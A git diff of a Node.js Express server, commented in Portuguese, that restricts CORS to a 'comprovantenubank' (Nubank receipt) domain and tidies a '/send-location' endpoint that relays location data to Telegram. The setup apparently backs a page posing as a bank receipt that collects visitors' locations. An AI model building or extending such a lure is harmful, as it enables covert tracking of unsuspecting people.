@@ -8,7 +8,7 @@ const app = express();
 // Configuração do CORS para permitir requisições do domínio específico
 // Durante o desenvolvimento, pode ser interessante permitir todas as origens
 app.use(cors({
-  origin: '*', // Permite todas as origens para desenvolvimento, altere para 'https://comprovantenubank.vercel.app' em produção
+  origin: 'https://comprovantenubank.vercel.app', // Alterado para o domínio de produção
   methods: ['GET', 'POST'],
   allowedHeaders: ['Content-Type', 'Authorization']
 }));
@@ -39,19 +39,18 @@ app.post("/send-location", async (req, res) => {
 
     // Verifica a resposta do Telegram para garantir que o envio foi bem-sucedido
     if (response.data.ok) {
-      res.status(200).json({ success: true, message: "Localização enviada com sucesso para o Telegram." });
+      return res.status(200).json({ success: true, message: "Localização enviada com sucesso para o Telegram." });
     } else {
-      res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
+      return res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
     }
-
   } catch (error) {
     console.error("Erro ao enviar para o Telegram:", error.response ? error.response.data : error.message);
 
     // Tratamento de erros mais detalhado
-    res.status(500).json({ 
+    return res.status(500).json({ 
       success: false, 
       message: "Erro ao enviar a localização para o Telegram. Tente novamente mais tarde.",
-      error: error.message
+      error: error.message // Inclui a mensagem de erro para ajudar na depuração
     });
   }
 });
